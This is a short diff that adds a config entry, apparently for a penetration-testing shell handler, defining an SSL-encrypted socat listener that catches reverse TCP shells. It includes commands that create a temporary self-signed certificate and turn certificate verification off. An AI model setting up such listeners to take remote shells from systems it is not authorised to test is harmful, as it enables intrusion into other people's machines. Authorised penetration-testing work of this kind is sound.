@@ -1,0 +1,6 @@
+title=Reverse TCP SSL socat listener
+info=PARAM1 should point to our tty -> add: -1 `tty`
+required_opts=LPORT;PARAM1
+app=/usr/bin/socat
+params=file:PARAM1,raw,echo=0;openssl-listen:LPORT,cert=/tmp/s.pem,verify=0
+pre_exec=openssl genrsa -out /tmp/s.key 2>/dev/null; openssl req -new -key /tmp/s.key -x509 -days 10 -out /tmp/s.crt -batch; cat /tmp/s.key /tmp/s.crt > /tmp/s.pem;
